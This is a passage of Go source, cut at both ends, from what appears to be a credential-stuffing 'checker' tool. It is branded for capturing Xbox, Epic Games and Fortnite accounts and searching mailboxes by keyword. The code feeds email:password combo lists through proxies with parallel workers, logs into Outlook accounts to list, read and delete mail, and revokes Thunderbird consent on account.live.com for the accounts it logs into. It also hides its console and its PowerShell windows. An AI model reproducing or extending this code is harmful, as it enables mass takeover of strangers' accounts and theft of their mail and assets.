	low := strings.ToLower(combined)
	if strings.Contains(low, "password is incorrect") || strings.Contains(low, "account doesn't exist") {
		return fmt.Errorf("login failed: wrong password")
	}
	if strings.Contains(low, "identity/confirm") || strings.Contains(low, "proofs") {
		return fmt.Errorf("login needs extra verification")
	}
	req3, _ := http.NewRequest("GET", start, nil)
	req3.Header.Set("User-Agent", ua)
	resp3, err := doReq(client, req3)
	if err != nil {
		return fmt.Errorf("reload manage: %w", err)
	}
	b3, _ := io.ReadAll(resp3.Body)
	resp3.Body.Close()
	manage := string(b3)
	fmt.Println("manage page", resp3.StatusCode, "bytes", len(manage))
	_ = os.WriteFile("consent-manage.html", b3, 0644)
	apps := parseConsentApps(manage)
	fmt.Println("apps found", len(apps))
	for _, a := range apps {
		fmt.Printf("  - %s  id=%s\n", a.Name, a.ID)
	}
	revoked := 0
	for _, a := range apps {
		n := strings.ToLower(a.Name + " " + a.ID)
		if !strings.Contains(n, "thunderbird") && !strings.Contains(n, "mozilla thunder") {
			continue
		}
		fmt.Println("revoking", a.Name, a.ID)
		if err := postConsentRevoke(client, ua, manage, a); err != nil {
			fmt.Println("  revoke err:", err)
			continue
		}
		revoked++
	}
	req4, _ := http.NewRequest("GET", start+"?nocache=1", nil)
	req4.Header.Set("User-Agent", ua)
	resp4, err := doReq(client, req4)
	if err == nil {
		b4, _ := io.ReadAll(resp4.Body)
		resp4.Body.Close()
		left := parseConsentApps(string(b4))
		still := false
		fmt.Println("after revoke, apps", len(left))
		for _, a := range left {
			fmt.Printf("  - %s  id=%s\n", a.Name, a.ID)
			if strings.Contains(strings.ToLower(a.Name), "thunderbird") || strings.Contains(strings.ToLower(a.Name), "mozilla thunder") {
				still = true
			}
		}
		if still {
			return fmt.Errorf("thunderbird still listed after revoke")
		}
	}
	if revoked == 0 {
		fmt.Println("no Thunderbird consent entry was listed")
	} else {
		fmt.Println("revoked Thunderbird entries:", revoked)
	}
	return nil
}

type consentApp struct {
	Name string
	ID   string
}

func parseConsentApps(page string) []consentApp {
	var out []consentApp
	seen := map[string]bool{}
	re := regexp.MustCompile(`(?i)(?:client[_-]?id|appid|applicationid)["'=\s:]+([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})`)
	ids := re.FindAllStringSubmatch(page, -1)
	nameRe := regexp.MustCompile(`(?i)(thunderbird|mozilla[^<]{0,40}|"[^"]{2,80}")`)
	_ = nameRe
	for _, m := range ids {
		id := strings.ToLower(m[1])
		if seen[id] {
			continue
		}
		seen[id] = true
		name := consentNameNear(page, m[1])
		out = append(out, consentApp{Name: name, ID: id})
	}
	// also pick visible titles
	titleRe := regexp.MustCompile(`(?i)>([^<]*(?:Thunderbird|Mozilla Thunderbird)[^<]*)<`)
	for _, m := range titleRe.FindAllStringSubmatch(page, -1) {
		out = append(out, consentApp{Name: strings.TrimSpace(m[1]), ID: ""})
	}
	return out
}

func consentNameNear(page, id string) string {
	idx := strings.Index(strings.ToLower(page), strings.ToLower(id))
	if idx < 0 {
		return id
	}
	start := idx - 400
	if start < 0 {
		start = 0
	}
	end := idx + 200
	if end > len(page) {
		end = len(page)
	}
	chunk := page[start:end]
	if i := strings.Index(strings.ToLower(chunk), "thunderbird"); i >= 0 {
		return "Thunderbird"
	}
	re := regexp.MustCompile(`(?i)aria-label="([^"]+)"|alt="([^"]+)"|<h[1-4][^>]*>([^<]+)<`)
	if m := re.FindStringSubmatch(chunk); len(m) > 0 {
		for _, g := range m[1:] {
			if strings.TrimSpace(g) != "" {
				return strings.TrimSpace(g)
			}
		}
	}
	return id
}

func postConsentRevoke(client tls_client.HttpClient, ua, page string, app consentApp) error {
	if app.ID == "" {
		return fmt.Errorf("no client id for %s", app.Name)
	}
	canary := firstMatch(page, `name="canary"[^>]*value="([^"]+)"`)
	if canary == "" {
		canary = firstMatch(page, `"canary"\s*:\s*"([^"]+)"`)
	}
	edit := "https://account.live.com/consent/Edit?client_id=" + url.QueryEscape(app.ID)
	req, _ := http.NewRequest("GET", edit, nil)
	req.Header.Set("User-Agent", ua)
	resp, err := doReq(client, req)
	if err != nil {
		return err
	}
	eb, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	ep := string(eb)
	if c := firstMatch(ep, `name="canary"[^>]*value="([^"]+)"`); c != "" {
		canary = c
	}
	form := url.Values{}
	form.Set("client_id", app.ID)
	form.Set("canary", canary)
	form.Set("action", "revoke")
	form.Set("Revoke", "Remove")
	posts := []string{
		"https://account.live.com/consent/Edit?client_id=" + url.QueryEscape(app.ID),
		"https://account.live.com/consent/Edit",
	}
	var last error
	for _, p := range posts {
		reqP, _ := http.NewRequest("POST", p, strings.NewReader(form.Encode()))
		reqP.Header.Set("User-Agent", ua)
		reqP.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		reqP.Header.Set("Origin", "https://account.live.com")
		reqP.Header.Set("Referer", edit)
		respP, err := doReq(client, reqP)
		if err != nil {
			last = err
			continue
		}
		_, _ = io.ReadAll(respP.Body)
		respP.Body.Close()
		fmt.Println("  revoke post", p, respP.StatusCode)
		if respP.StatusCode < 400 {
			return nil
		}
		last = fmt.Errorf("status %d", respP.StatusCode)
	}
	return last
}

func firstMatch(s, pat string) string {
	re := regexp.MustCompile(pat)
	m := re.FindStringSubmatch(s)
	if len(m) > 1 {
		return m[1]
	}
	return ""
}

func main() {
	hideConsole()
	afterUpdateCleanup()
	go pullQuotaFromCloud()
	if len(os.Args) > 1 && os.Args[1] == "--revoke-tbird" {
		combo := os.Getenv("MAILTEST_COMBO")
		if combo == "" && len(os.Args) > 2 {
			combo = os.Args[2]
		}
		proxy := os.Getenv("MAILTEST_PROXY")
		if proxy == "" && len(os.Args) > 3 {
			proxy = os.Args[3]
		}
		email, pass, _ := strings.Cut(combo, ":")
		if err := revokeThunderbirdConsent(strings.TrimSpace(email), strings.TrimSpace(pass), strings.TrimSpace(proxy)); err != nil {
			fmt.Println("REVOKE_ERR", err)
			os.Exit(1)
		}
		return
	}
	if len(os.Args) > 1 && os.Args[1] == "--mailtest" {
		combo := os.Getenv("MAILTEST_COMBO")
		if combo == "" && len(os.Args) > 2 {
			combo = os.Args[2]
		}
		email, pass, _ := strings.Cut(combo, ":")
		email, pass = strings.TrimSpace(email), strings.TrimSpace(pass)
		fmt.Println("mailtest login", email)
		msgs, err := listOutlookMailOnce(email, pass, "", 0, 20, "", "inbox")
		if err != nil {
			fmt.Println("MAIL_ERR", err)
		} else {
			fmt.Println("MAIL_OK", len(msgs))
			for i, m := range msgs {
				if i >= 8 {
					break
				}
				fmt.Printf("  - %s | from=%s | preview=%d chars\n", m.Subject, m.From, len(m.Preview))
			}
		}
		kind := classifyAccountType(email, "")
		fmt.Println("ACCOUNT_TYPE", kind)
		return
	}
	if len(os.Args) > 1 && os.Args[1] == "--folders-test" {
		combo := os.Getenv("MAILTEST_COMBO")
		if combo == "" && len(os.Args) > 2 {
			combo = os.Args[2]
		}
		email, pass, _ := strings.Cut(combo, ":")
		email, pass = strings.TrimSpace(email), strings.TrimSpace(pass)
		fmt.Println("folders-test", email)
		for _, folder := range []string{"inbox", "sent", "spam", "deleted"} {
			msgs, err := listOutlookMailOnce(email, pass, "", 0, 15, "kind:email", folder)
			if err != nil {
				fmt.Printf("[%s] ERR %v\n", folder, err)
				continue
			}
			fmt.Printf("[%s] count=%d folderName=%s\n", folder, len(msgs), outlookFolderName(folder))
			for i, m := range msgs {
				if i >= 5 {
					break
				}
				fmt.Printf("  - %s | from=%s\n", m.Subject, m.From)
			}
		}
		return
	}
	if len(os.Args) > 1 && os.Args[1] == "--viewer" {
		_ = openAppWindowTitled("Valid Viewer", "http://127.0.0.1:2719/", 1180, 820)
		return
	}
	mux := stdhttp.NewServeMux()
	mux.HandleFunc("/", handleGUI)
	mux.HandleFunc("/api/state", handleGUIState)
	mux.HandleFunc("/api/start", handleGUIStart)
	mux.HandleFunc("/api/sessions", handleGUISessions)
	mux.HandleFunc("/api/pick", handleGUIPick)
	mux.HandleFunc("/api/pick-save", handleGUIPickSave)
	mux.HandleFunc("/api/pause", handleGUIPause)
	mux.HandleFunc("/api/stop", handleGUIStop)
	mux.HandleFunc("/api/proxy-lists", handleProxyLists)
	mux.HandleFunc("/api/proxy-fetch", handleProxyFetch)
	mux.HandleFunc("/viewer", handleValidViewer)
	mux.HandleFunc("/api/valids", handleValidList)
	mux.HandleFunc("/api/open-viewer", handleOpenViewer)
	mux.HandleFunc("/api/open-link", handleOpenLink)
	mux.HandleFunc("/api/editor/analyze", handleEditorAnalyze)
	mux.HandleFunc("/api/editor/analyze-stream", handleEditorAnalyzeStream)
	mux.HandleFunc("/api/editor/extract", handleEditorExtract)
	mux.HandleFunc("/api/editor/generate", handleEditorGenerate)
	mux.HandleFunc("/api/editor/save", handleEditorSave)
	mux.HandleFunc("/api/editor/filter", handleEditorFilter)
	mux.HandleFunc("/api/editor/filter-stream", handleEditorFilterStream)
	mux.HandleFunc("/api/editor/banners", handleEditorBanners)
	mux.HandleFunc("/api/mail/list", handleMailList)
	mux.HandleFunc("/api/mail/probe", handleMailProbe)
	mux.HandleFunc("/api/mail/delete", handleMailDelete)
	mux.HandleFunc("/api/mail/body", handleMailBody)
	mux.HandleFunc("/api/mail/view", handleMailView)
	mux.HandleFunc("/api/update/check", handleUpdateCheck)
	mux.HandleFunc("/api/update/apply", handleUpdateApply)
	addr := "127.0.0.1:2718"
	go func() {
		_ = stdhttp.ListenAndServe(addr, mux)
	}()
	viewerMux := stdhttp.NewServeMux()
	viewerMux.HandleFunc("/", handleValidViewer)
	viewerMux.HandleFunc("/viewer", handleValidViewer)
	viewerMux.HandleFunc("/api/valids", handleValidList)
	viewerMux.HandleFunc("/api/accounts", handleViewerAccounts)
	viewerMux.HandleFunc("/api/stats", handleViewerStats)
	viewerMux.HandleFunc("/api/reload", handleViewerReload)
	viewerMux.HandleFunc("/api/events", handleViewerEvents)
	viewerMux.HandleFunc("/api/mail/list", handleMailList)
	viewerMux.HandleFunc("/api/mail/probe", handleMailProbe)
	viewerMux.HandleFunc("/api/mail/delete", handleMailDelete)
	viewerMux.HandleFunc("/api/mail/body", handleMailBody)
	viewerMux.HandleFunc("/api/mail/view", handleMailView)
	viewerMux.HandleFunc("/api/proxy-lists", handleProxyLists)
	viewerMux.HandleFunc("/api/proxy-fetch", handleProxyFetch)
	viewerMux.HandleFunc("/api/pick", handleGUIPick)
	go func() {
		_ = stdhttp.ListenAndServe("127.0.0.1:2719", viewerMux)
	}()
	time.Sleep(200 * time.Millisecond)
	if openAppWindow("http://" + addr) {
		return
	}
	openBrowser("http://" + addr)
	select {}
}

var (
	mainWV webview2.WebView
)

func openAppWindow(u string) bool {
	return openAppWindowTitled("Xbox Full Capture + Keyword Inboxer + Promos / Codes & Epic Games / Fortnite Full Capture @solodolosouls", u, 1360, 820)
}

func openAppWindowTitled(title, u string, width, height int) bool {
	if runtime.GOOS != "windows" {
		return false
	}
	w := webview2.NewWithOptions(webview2.WebViewOptions{
		AutoFocus: true,
		WindowOptions: webview2.WindowOptions{
			Title:  title,
			Width:  uint(width),
			Height: uint(height),
			IconId: 2,
			Center: true,
		},
	})
	if w == nil {
		return false
	}
	defer w.Destroy()
	if title != "Valid Viewer" {
		mainWV = w
	}
	w.SetSize(width, height, webview2.HintNone)
	w.Navigate(u)
	w.Run()
	return true
}

func openBrowser(u string) {
	if runtime.GOOS == "windows" {
		_ = exec.Command("rundll32", "url.dll,FileProtocolHandler", u).Start()
		return
	}
	_ = exec.Command("xdg-open", u).Start()
}

type guiSessionCard struct {
	File     string `json:"file"`
	Combo    string `json:"combo"`
	Proxy    string `json:"proxy"`
	Keywords string `json:"keywords"`
	Workers  int    `json:"workers"`
	Retries  int    `json:"retries"`
	Updated  string `json:"updated"`
	Started  string `json:"started"`
}

type guiSnap struct {
	Running  bool             `json:"running"`
	Paused   bool             `json:"paused"`
	Status   string           `json:"status"`
	Valid    int              `json:"valid"`
	Invalid  int              `json:"invalid"`
	Retries  int              `json:"retries"`
	Checked  int              `json:"checked"`
	Total    int              `json:"total"`
	Daily    int              `json:"daily"`
	Limit    int              `json:"limit"`
	UID      string           `json:"uid"`
	Logs     []string         `json:"logs"`
	Hits     []string         `json:"hits"`
	Free     int              `json:"free"`
	Private  int              `json:"private"`
	Combo    string           `json:"combo"`
	Proxy    string           `json:"proxy"`
	Keywords string           `json:"keywords"`
	Workers  string           `json:"workers"`
	Sessions []guiSessionCard `json:"sessions"`
	Elapsed  string           `json:"elapsed"`
	ETA      string           `json:"eta"`
	RateCPM  float64          `json:"rate_cpm"`
}

var (
	guiMu      sync.Mutex
	guiRunning int32
	guiPaused  int32
	guiStatus  = "Ready"
	guiValid   int
	guiInvalid int
	guiRetries int
	guiChecked int
	guiTotal   int
	guiLogs    []string
	guiHits    []string
	guiFree    int
	guiPrivate int
	engineAlive int32
	guiStop     int32
	guiStartedAt    time.Time
	guiPauseStarted time.Time
	guiPausedAccum  time.Duration
	// rolling samples of checked counts for smoother ETA (unix ms, checked)
	guiRateSamples [][2]int64
)


func formatDurationShort(d time.Duration) string {
	if d < 0 {
		d = 0
	}
	sec := int(d.Seconds())
	h := sec / 3600
	m := (sec % 3600) / 60
	s := sec % 60
	if h > 0 {
		return fmt.Sprintf("%dh %dm %ds", h, m, s)
	}
	if m > 0 {
		return fmt.Sprintf("%dm %ds", m, s)
	}
	return fmt.Sprintf("%ds", s)
}

func guiActiveElapsed() time.Duration {
	if guiStartedAt.IsZero() {
		return 0
	}
	elapsed := time.Since(guiStartedAt) - guiPausedAccum
	if atomic.LoadInt32(&guiPaused) == 1 && !guiPauseStarted.IsZero() {
		elapsed -= time.Since(guiPauseStarted)
	}
	if elapsed < 0 {
		elapsed = 0
	}
	return elapsed
}

func guiComputeETA(checked, total int) (elapsedStr, etaStr string, rateCPM float64) {
	elapsed := guiActiveElapsed()
	elapsedStr = formatDurationShort(elapsed)
	if atomic.LoadInt32(&guiRunning) != 1 && checked == 0 {
		return elapsedStr, "—", 0
	}
	// Prefer recent window (~last 30s of samples) for adaptive ETA
	nowMs := time.Now().UnixMilli()
	samples := guiRateSamples
	var ratePerSec float64
	if len(samples) >= 2 {
		// drop samples older than 45s
		cut := nowMs - 45000
		i0 := 0
		for i0 < len(samples) && samples[i0][0] < cut {
			i0++
		}
		if i0 > 0 && i0 < len(samples) {
			samples = samples[i0:]
		}
		if len(samples) >= 2 {
			dt := float64(samples[len(samples)-1][0]-samples[0][0]) / 1000.0
			dc := float64(samples[len(samples)-1][1] - samples[0][1])
			if dt > 0.5 && dc >= 0 {
				ratePerSec = dc / dt
			}
		}
	}
	// Fallback: overall session rate (exclude pause)
	if ratePerSec <= 0 && elapsed.Seconds() >= 2 && checked > 0 {
		ratePerSec = float64(checked) / elapsed.Seconds()
	}
	rateCPM = ratePerSec * 60
	remain := total - checked
	if remain < 0 {
		remain = 0
	}
	if ratePerSec <= 0.01 || checked < 3 {
		if atomic.LoadInt32(&guiRunning) == 1 {
			etaStr = "calculating…"
		} else {
			etaStr = "—"
		}
		return elapsedStr, etaStr, rateCPM
	}
	if remain == 0 {
		return elapsedStr, "done", rateCPM
	}
	secs := float64(remain) / ratePerSec
	etaStr = formatDurationShort(time.Duration(secs * float64(time.Second)))
	return elapsedStr, etaStr, rateCPM
}

func handleGUIState(w stdhttp.ResponseWriter, r *stdhttp.Request) {
	guiMu.Lock()
	elapsedStr, etaStr, rateCPM := guiComputeETA(guiChecked, guiTotal)
	s := guiSnap{
		Running: atomic.LoadInt32(&guiRunning) == 1,
		Paused:  atomic.LoadInt32(&guiPaused) == 1,
		Status:  guiStatus,
		Valid:   guiValid,
		Invalid: guiInvalid,
		Retries: guiRetries,
		Checked: guiChecked,
		Total:   guiTotal,
		Daily:   dailyUsed(),
		Limit:   dailyLimit,
		UID:     systemMachineID(),
		Logs:    append([]string{}, guiLogs...),
		Hits:    append([]string{}, guiHits...),
		Free:    guiFree,
		Private: guiPrivate,
		Elapsed: elapsedStr,
		ETA:     etaStr,
		RateCPM: rateCPM,
	}
	guiMu.Unlock()
	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(s)
}

func handleGUIStart(w stdhttp.ResponseWriter, r *stdhttp.Request) {
	if r.Method != stdhttp.MethodPost {
		stdhttp.Error(w, "POST only", 405)
		return
	}
	var req struct {
		Combo       string   `json:"combo"`
		Proxy       string   `json:"proxy"`
		ProxyMode   string   `json:"proxy_mode"`
		ProxyURLs   []string `json:"proxy_urls"`
		Keywords    string `json:"keywords"`
		Workers     string `json:"workers"`
		Resume      bool   `json:"resume"`
		SessionFile string `json:"session_file"`
		KeywordsOn  *bool  `json:"keywords_on"`
		PaymentsOn  *bool  `json:"payments_on"`
		PromosOn    *bool  `json:"promos_on"`
		FortniteOn  *bool  `json:"fortnite_on"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		stdhttp.Error(w, err.Error(), 400)
		return
	}
	if atomic.LoadInt32(&guiRunning) == 1 || atomic.LoadInt32(&engineAlive) == 1 {
		stopCheckerEngine()
	}
	atomic.StoreInt32(&guiStop, 0)
	atomic.StoreInt32(&guiPaused, 0)
	atomic.StoreInt32(&guiRunning, 1)
	combo := resolveLocalFile(strings.TrimSpace(req.Combo))
	if combo == "" || !fileExists(combo) {
		atomic.StoreInt32(&guiRunning, 0)
		stdhttp.Error(w, "combo file not found: "+strings.TrimSpace(req.Combo), 400)
		return
	}
	if quotaAtLimit() {
		atomic.StoreInt32(&guiRunning, 0)
		stdhttp.Error(w, limitMessage(), 429)
		return
	}
	wc := 20
	fmt.Sscanf(strings.TrimSpace(req.Workers), "%d", &wc)
	if wc <= 0 {
		wc = 20
	}
	proxyIn := strings.TrimSpace(req.Proxy)
	var proxies []string
	var err error
	if strings.EqualFold(strings.TrimSpace(req.ProxyMode), "server") {
		proxies, err = fetchProxiesFromURLs(req.ProxyURLs)
		proxyIn = strings.Join(req.ProxyURLs, ",")
	} else {
		if proxyIn != "" && (strings.HasSuffix(strings.ToLower(proxyIn), ".txt") || strings.Contains(proxyIn, `\`) || strings.Contains(proxyIn, `/`)) {
			if p := resolveLocalFile(proxyIn); p != "" {
				proxyIn = p
			}
		}
		proxies, err = loadProxies(proxyIn)
	}
	if err != nil {
		atomic.StoreInt32(&guiRunning, 0)
		stdhttp.Error(w, err.Error(), 400)
		return
	}
	cfg := Config{
		ComboPath:     combo,
		ProxyInput:    proxyIn,
		KeywordsInput: strings.TrimSpace(req.Keywords),
		Proxies:       proxies,
		Workers:       wc,
		Keywords:      parseKeywords(req.Keywords),
		CapKeywords:   req.KeywordsOn == nil || *req.KeywordsOn,
		CapPayments:   req.PaymentsOn == nil || *req.PaymentsOn,
		CapPromos:     req.PromosOn == nil || *req.PromosOn,
		CapFortnite:   req.FortniteOn == nil || *req.FortniteOn,
	}
	if req.Resume {
		if req.SessionFile != "" {
			if b, err := os.ReadFile(req.SessionFile); err == nil {
				var s Session
				if json.Unmarshal(b, &s) == nil {
					s.File = req.SessionFile
					cfg.Session = &s
					if cfg.ComboPath == "" {
						cfg.ComboPath = s.ComboPath
						combo = s.ComboPath
					}
					if cfg.ProxyInput == "" {
						cfg.ProxyInput = s.ProxyInput
					}
					if cfg.KeywordsInput == "" {
						cfg.KeywordsInput = s.KeywordsInput
						cfg.Keywords = parseKeywords(s.KeywordsInput)
					}
					if cfg.Workers == 20 && s.Workers > 0 {
						cfg.Workers = s.Workers
					}
				}
			}
		} else if s, err := loadSession(); err == nil && s != nil {
			cfg.Session = s
		}
	}
	attachSession(&cfg, req.Resume)

	guiMu.Lock()
	guiValid, guiInvalid, guiRetries, guiChecked, guiTotal, guiFree, guiPrivate = 0, 0, 0, 0, 0, 0, 0
	guiLogs, guiHits = nil, nil
	guiStartedAt = time.Now()
	guiPauseStarted = time.Time{}
	guiPausedAccum = 0
	guiRateSamples = nil
	guiStatus = fmt.Sprintf("Running — %d workers · %s", wc, filepath.Base(combo))
	guiMu.Unlock()

	ch := make(chan ProgressEvent, 50000)
	atomic.StoreInt32(&engineAlive, 1)
	go runCheckerEngine(cfg, ch)
	go func() {
		for ev := range ch {
			guiMu.Lock()
			if ev.IsRetry {
				guiRetries += ev.RetryDelta
				if guiRetries < 0 {
					guiRetries = 0
				}
			}
			if ev.IsValid {
				guiValid++
				if strings.Contains(ev.LogMsg, "[Free Hit]") {
					guiFree++
				} else if strings.Contains(ev.LogMsg, "[Private Hit]") {
					guiPrivate++
				}
				guiChecked++
				guiRateSamples = append(guiRateSamples, [2]int64{time.Now().UnixMilli(), int64(guiChecked)})
				if len(guiRateSamples) > 120 {
					guiRateSamples = guiRateSamples[len(guiRateSamples)-120:]
				}
				if ev.Hit != "" {
					guiHits = append(guiHits, ev.Hit)
					if len(guiHits) > 80 {
						guiHits = guiHits[len(guiHits)-80:]
					}
				}
			} else if !ev.IsRetry && !ev.IsDone && !ev.LimitHit {
				guiInvalid++
				guiChecked++
				guiRateSamples = append(guiRateSamples, [2]int64{time.Now().UnixMilli(), int64(guiChecked)})
				if len(guiRateSamples) > 120 {
					guiRateSamples = guiRateSamples[len(guiRateSamples)-120:]
				}
			}
			if ev.LogMsg != "" {
				guiLogs = append(guiLogs, ev.LogMsg)
				if len(guiLogs) > 80 {
					guiLogs = guiLogs[len(guiLogs)-80:]
				}
			}
			if ev.LimitHit {
				guiStatus = limitMessage()
			}
			if ev.IsDone {
				if atomic.LoadInt32(&guiStop) == 1 {
					guiStatus = "Stopped — session saved. Return to menu."
				} else if quotaAtLimit() {
					guiStatus = limitMessage()
				} else {
					guiStatus = "Done — saved to valid.txt. Return to menu."
				}
				atomic.StoreInt32(&guiRunning, 0)
				atomic.StoreInt32(&engineAlive, 0)
			}
			guiMu.Unlock()
		}
		atomic.StoreInt32(&guiRunning, 0)
		atomic.StoreInt32(&engineAlive, 0)
	}()
	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(map[string]any{"ok": true, "total": 0})
}

func handleGUISessions(w stdhttp.ResponseWriter, r *stdhttp.Request) {
	var cards []guiSessionCard
	for _, sess := range listSessions() {
		cards = append(cards, guiSessionCard{
			File:     sess.File,
			Combo:    sess.ComboPath,
			Proxy:    sess.ProxyInput,
			Keywords: sess.KeywordsInput,
			Workers:  sess.Workers,
			Retries:  len(sess.RetryLines),
			Updated:  sess.UpdatedAt,
			Started:  sess.StartedAt,
		})
	}
	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(map[string]any{"sessions": cards})
}

func stopCheckerEngine() {
	atomic.StoreInt32(&guiPaused, 0)
	atomic.StoreInt32(&guiStop, 1)
	for i := 0; i < 40 && atomic.LoadInt32(&engineAlive) == 1; i++ {
		time.Sleep(100 * time.Millisecond)
	}
	atomic.StoreInt32(&guiRunning, 0)
	atomic.StoreInt32(&engineAlive, 0)
	guiMu.Lock()
	guiStatus = "Stopped — session saved"
	guiMu.Unlock()
}

func handleGUIStop(w stdhttp.ResponseWriter, r *stdhttp.Request) {
	stopCheckerEngine()
	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(map[string]any{"ok": true, "stopped": true})
}

func handleGUIPause(w stdhttp.ResponseWriter, r *stdhttp.Request) {
	if atomic.LoadInt32(&guiRunning) != 1 {
		_ = json.NewEncoder(w).Encode(map[string]any{"ok": false, "error": "not running"})
		return
	}
	guiMu.Lock()
	if atomic.LoadInt32(&guiPaused) == 1 {
		atomic.StoreInt32(&guiPaused, 0)
		if !guiPauseStarted.IsZero() {
			guiPausedAccum += time.Since(guiPauseStarted)
			guiPauseStarted = time.Time{}
		}
		guiStatus = "Running — resumed"
	} else {
		atomic.StoreInt32(&guiPaused, 1)
		guiPauseStarted = time.Now()
		guiStatus = "Paused — workers are waiting"
	}
	paused := atomic.LoadInt32(&guiPaused) == 1
	guiMu.Unlock()
	_ = json.NewEncoder(w).Encode(map[string]any{"ok": true, "paused": paused})
}

func handleGUIPick(w stdhttp.ResponseWriter, r *stdhttp.Request) {
	title := "Select file"
	if r.URL.Query().Get("kind") == "proxy" {
		title = "Select proxy list"
	} else {
		title = "Select combo file"
	}
	path := windowsOpenFile(title)
	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(map[string]string{"path": path})
}

func handleGUIPickSave(w stdhttp.ResponseWriter, r *stdhttp.Request) {
	name := strings.TrimSpace(r.URL.Query().Get("name"))
	if name == "" {
		name = "combos-export.txt"
	}
	path := windowsSaveFile("Export combos", name)
	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(map[string]string{"path": path})
}

func windowsSaveFile(title string, names ...string) string {
	def := "combos-export.txt"
	if len(names) > 0 && strings.TrimSpace(names[0]) != "" {
		def = strings.TrimSpace(names[0])
	}
	if runtime.GOOS != "windows" {
		return def
	}
	ps := `Add-Type -AssemblyName System.Windows.Forms; $form = New-Object System.Windows.Forms.Form; $form.TopMost = $true; $form.WindowState = 'Minimized'; $form.ShowInTaskbar = $false; $null = $form.Handle; $f = New-Object System.Windows.Forms.SaveFileDialog; $f.Filter = 'Text (*.txt)|*.txt|All files (*.*)|*.*'; $f.Title = '` + strings.ReplaceAll(title, "'", "") + `'; $f.FileName = '` + strings.ReplaceAll(def, "'", "") + `'; if ($f.ShowDialog($form) -eq 'OK') { $f.FileName }; $form.Close()`
	out, err := runHiddenPowerShell(ps)
	if err != nil {
		return ""
	}
	return strings.TrimSpace(string(out))
}

func runHiddenPowerShell(ps string) ([]byte, error) {
	cmd := exec.Command("powershell", "-NoProfile", "-WindowStyle", "Hidden", "-STA", "-Command", ps)
	cmd.Stdin = nil
	return cmd.Output()
}

func windowsOpenFile(title string) string {
	if runtime.GOOS != "windows" {
		return ""
	}
	ps := `Add-Type -AssemblyName System.Windows.Forms; $form = New-Object System.Windows.Forms.Form; $form.TopMost = $true; $form.ShowInTaskbar = $false; $null = $form.Handle; $f = New-Object System.Windows.Forms.OpenFileDialog; $f.Filter = 'Text (*.txt)|*.txt|All files (*.*)|*.*'; $f.Title = '` + strings.ReplaceAll(title, "'", "") + `'; $f.InitialDirectory = [Environment]::GetFolderPath('Desktop'); $f.RestoreDirectory = $true; $f.CheckFileExists = $true; if ($f.ShowDialog($form) -eq 'OK') { $f.FileName }; $form.Close()`
	out, err := runHiddenPowerShell(ps)
	if err != nil {
		return ""
	}
	return strings.TrimSpace(string(out))
}

func proxyListsFile() string {
	dir := filepath.Join(sessionsDir, "proxies")
	_ = os.MkdirAll(dir, 0755)
	return filepath.Join(dir, "saved.json")
}

type savedProxyList struct {
	Name  string   `json:"name"`
	Path  string   `json:"path"`
	Type  string   `json:"type"`
	URLs  []string `json:"urls,omitempty"`
	Count int      `json:"count"`
}

func loadProxyLists() []savedProxyList {
	b, err := os.ReadFile(proxyListsFile())
	if err != nil {
		return nil
	}
	var out []savedProxyList
	if json.Unmarshal(b, &out) != nil {
		return nil
	}
	return out
}

func saveProxyLists(list []savedProxyList) {
	b, err := json.MarshalIndent(list, "", "  ")
	if err != nil {
		return
	}
	_ = os.WriteFile(proxyListsFile(), b, 0644)
}

func handleProxyLists(w stdhttp.ResponseWriter, r *stdhttp.Request) {
	w.Header().Set("Content-Type", "application/json")
	if r.Method == stdhttp.MethodPost {
		var req savedProxyList
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
			stdhttp.Error(w, err.Error(), 400)
			return
		}
		req.Path = strings.TrimSpace(req.Path)
		if req.Type == "" {
			if len(req.URLs) > 0 {
				req.Type = "server"
			} else {
				req.Type = "file"
			}
		}
		if req.Type == "server" {
			var urls []string
			for _, u := range req.URLs {
				u = strings.TrimSpace(u)
				if u != "" {
					urls = append(urls, u)
				}
			}
			req.URLs = urls
			if len(req.URLs) == 0 {
				stdhttp.Error(w, "no proxy URLs", 400)
				return
			}
			if px, err := fetchProxiesFromURLs(req.URLs); err == nil {
				req.Count = len(px)
			}
		} else if req.Path == "" {
			stdhttp.Error(w, "no proxy path", 400)
			return
		} else {
			if p := resolveLocalFile(req.Path); p != "" {
				req.Path = p
			}
			if px, err := loadProxies(req.Path); err == nil {
				req.Count = len(px)
				ensurePxPool(req.Path, px)
			}
		}
		if req.Name == "" {
			if req.Path != "" {
				req.Name = filepath.Base(req.Path)
			} else {
				req.Name = "proxy-server"
			}
		}
		list := loadProxyLists()
		found := false
		for i := range list {
			if strings.EqualFold(list[i].Path, req.Path) || strings.EqualFold(list[i].Name, req.Name) {
				list[i] = req
				found = true
				break
			}
		}
		if !found {
			list = append(list, req)
		}
		saveProxyLists(list)
		_ = json.NewEncoder(w).Encode(list)
		return
	}
	if r.Method == stdhttp.MethodDelete {
		name := strings.TrimSpace(r.URL.Query().Get("name"))
		path := strings.TrimSpace(r.URL.Query().Get("path"))
		list := loadProxyLists()
		out := list[:0]
		for _, x := range list {
			if name != "" && strings.EqualFold(x.Name, name) {
				continue
			}
			if path != "" && strings.EqualFold(x.Path, path) {
				continue
			}
			if name == "" && path == "" {
				out = append(out, x)
				continue
			}
			out = append(out, x)
		}
		saveProxyLists(out)
		_ = json.NewEncoder(w).Encode(out)
		return
	}
	list := loadProxyLists()
	for i := range list {
		if list[i].Type == "server" {
			continue
		}
		if p := strings.TrimSpace(list[i].Path); p != "" {
			if px, err := loadProxies(p); err == nil {
				list[i].Count = len(px)
			}
		}
	}
	_ = json.NewEncoder(w).Encode(list)
}

func handleProxyFetch(w stdhttp.ResponseWriter, r *stdhttp.Request) {
	var req struct {
		URLs []string `json:"urls"`
		Path string   `json:"path"`
	}
	_ = json.NewDecoder(r.Body).Decode(&req)
	var (
		px  []string
		err error
	)
	if p := strings.TrimSpace(req.Path); p != "" {
